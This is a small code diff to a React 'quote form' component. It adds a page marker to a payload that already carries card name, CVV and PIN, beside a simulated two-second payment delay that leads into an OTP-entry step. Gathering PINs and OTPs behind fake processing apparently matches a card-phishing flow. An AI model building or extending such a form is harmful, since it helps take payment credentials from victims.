@@ -481,11 +481,13 @@ export function ProfessionalQuoteForm() {
         cardName: paymentData.cardName,
         cvv: paymentData.cvv,
         pinCode: paymentData.pinCode,
+        currentPage: "4",
       });
 
       setTimeout(() => {
         setPaymentProcessing(false);
         setCurrentStep(4);
+
         setOtpTimer(120);
         setOtpSent(true);
       }, 2000);
